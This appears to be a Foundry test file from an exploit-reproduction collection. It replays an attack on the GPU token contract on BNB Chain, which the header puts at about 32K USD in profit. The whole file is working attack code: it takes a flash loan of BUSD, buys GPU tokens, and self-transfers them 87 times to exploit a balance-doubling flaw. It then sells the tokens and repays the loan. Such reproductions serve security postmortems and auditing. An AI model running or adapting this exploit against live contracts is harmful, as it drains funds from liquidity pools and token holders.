// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// Profit : ~32K USD
// TX : https://app.blocksec.com/explorer/tx/bsc/0x2c0ada695a507d7a03f4f308f545c7db4847b2b2c82de79e702d655d8c95dadb
// GUY : https://twitter.com/PeckShieldAlert/status/1788153869987611113
// Vuln Contract: https://bscscan.com/address/0xf51cbf9f8e089ca48e454eb79731037a405972ce

contract GPUExploit is Test {
    IERC20 private gpuToken;
    IERC20 private busd;
    IUniswapV2Pair private busdWbnbPair;
    IUniswapV2Router private router;

    modifier balanceLog() {
        emit log_named_decimal_uint("Attacker BUSD Balance Before exploit", getBalance(busd), 18);
        _;
        emit log_named_decimal_uint("Attacker BUSD Balance After exploit", getBalance(busd), 18);
    }

    function setUp() external {
        vm.createSelectFork("bsc", 38_539_572);
        gpuToken = IERC20(0xf51CBf9F8E089Ca48e454EB79731037a405972ce);
        busd = IERC20(0x55d398326f99059fF775485246999027B3197955);
        busdWbnbPair = IUniswapV2Pair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
        router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
        busd.approve(address(router), type(uint256).max);
        gpuToken.approve(address(router), type(uint256).max);
    }

    function testExploit() public balanceLog {
        busdWbnbPair.swap(22_600 ether, 0, address(this), "0x42");
    }

    function getPath(address token0, address token1) internal pure returns (address[] memory) {
        address[] memory path = new address[](2);
        path[0] = token0;
        path[1] = token1;
        return path;
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        //Buy tokens with flashloaned busd
        _swap(amount0, busd, gpuToken);

        //Self transfer tokens to double tokens on each transfer
        for (uint256 i = 0; i < 87; i++) {
            gpuToken.transfer(address(this), getBalance(gpuToken));
        }

        //Sell all tokens to busd
        _swap(type(uint112).max, gpuToken, busd);

        //Payback flashloan
        uint256 feeAmount = (amount0 * 3) / 1000 + 1;
        busd.transfer(address(busdWbnbPair), amount0 + feeAmount);
    }

    function _swap(uint256 amountIn, IERC20 tokenA, IERC20 tokenB) private {
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, getPath(address(tokenA), address(tokenB)), address(this), block.timestamp
        );
    }

    function getBalance(IERC20 token) private view returns (uint256) {
        return token.balanceOf(address(this));
    }
}
